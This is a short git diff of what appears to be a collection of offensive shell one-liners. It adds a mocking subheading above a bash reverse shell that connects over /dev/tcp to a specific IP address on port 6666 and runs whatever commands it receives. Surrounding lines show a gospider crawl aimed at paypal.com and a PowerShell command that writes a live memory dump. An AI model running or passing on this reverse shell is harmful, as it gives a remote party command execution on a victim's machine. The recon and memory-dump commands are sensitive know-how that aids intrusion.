@@ -115,7 +115,8 @@ export domain="https://paypal.com";gospider -s $domain -d 3 -c 300 | awk '/linkf
 $ss = Get-CimInstance -ClassName MSFT_StorageSubSystem -Namespace Root\Microsoft\Windows\Storage; Invoke-CimMethod -InputObject $ss -MethodName "GetDiagnosticInfo" -Arguments @{DestinationPath="C:\Temp"; IncludeLiveDump=$true}
 ````
 
-### @nthcolumn with the bare bones reverse shell
+### @nthcolumn with the bare bones reverse shell 
+#### (and forgot to redact their ip address? lmao)
 ````
 exec 5<>/dev/tcp/194.26.29.6/6666
 cat <&5 | while read line; do $line 2>&5 >&5; done
